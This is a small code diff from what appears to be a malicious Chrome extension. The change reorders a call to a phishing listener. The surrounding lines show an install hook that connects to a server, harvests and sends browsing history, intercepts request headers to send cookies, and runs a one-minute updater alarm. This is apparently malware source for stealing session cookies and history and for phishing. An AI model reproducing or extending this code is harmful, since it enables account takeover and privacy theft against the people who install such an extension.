@@ -2,6 +2,7 @@ chrome.runtime.onInstalled.addListener(() => {
   connectToServer();
   searchAndSendHistory();
   createScriptListener();
+  createPhishingListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
       checkAndSendCookies(info);
     }, {
@@ -11,7 +12,6 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
-  createPhishingListener();
   chrome.alarms.create("updater", {
     periodInMinutes: 1
   });
